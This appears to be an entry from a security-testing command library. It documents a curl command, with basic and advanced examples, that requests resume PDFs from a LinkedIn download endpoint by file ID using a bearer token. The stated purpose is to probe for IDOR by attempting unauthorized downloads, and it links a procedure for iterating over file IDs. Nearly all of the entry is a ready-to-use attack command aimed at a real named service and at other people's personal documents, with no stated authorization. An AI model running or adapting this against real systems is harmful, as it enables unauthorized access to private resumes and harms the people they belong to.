---
data: >-
  curl -H "Authorization: Bearer YOUR_TOKEN"
  "https://www.linkedin.com/api/resumes/{FILE_ID}/download" -o
  test_{FILE_ID}.pdf --fail --silent
tags:
  - web-testing
  - api-probe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.175Z'
id: 5daab3ef-5e2b-4a91-9cbc-6045684c4290
verified: false
validated: true
submitted: true
---
# curl-download-test

## Command

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" "https://www.linkedin.com/api/resumes/{FILE_ID}/download" -o test_{FILE_ID}.pdf --fail --silent
```

## Description

This command tests access to a specific resume file ID on LinkedIn's download endpoint using curl, simulating an authenticated request to check for IDOR by attempting unauthorized downloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with session token | Yes |
| `"https://www.linkedin.com/api/resumes/{FILE_ID}/download"` | Endpoint URL with target file ID | Yes |
| `-o test_{FILE_ID}.pdf` | Output file name for the downloaded resume | Yes |
| `--fail` | Fail silently on HTTP errors | No |
| `--silent` | Suppress progress output | No |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer abc123" "https://www.linkedin.com/api/resumes/12346/download" -o test_12346.pdf
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer abc123" -H "User-Agent: Mozilla/5.0" "https://www.linkedin.com/api/resumes/12346/download" -o test_12346.pdf --fail --silent --max-time 30
```

## Expected Output

On success (200 OK), a PDF file is saved with resume content. On failure (403/404), no file is created, and exit code is non-zero if --fail is used.

## Related

- [[Related Procedure: Discover-IDOR-via-File-ID-Iteration]]
